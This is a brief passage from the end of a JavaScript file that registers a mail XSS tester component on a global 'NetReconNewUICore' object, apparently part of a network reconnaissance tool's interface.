  window.NetReconNewUICore = window.NetReconNewUICore || {};
  window.NetReconNewUICore.mailXssTester = createMailXssTesterRuntime();
})();
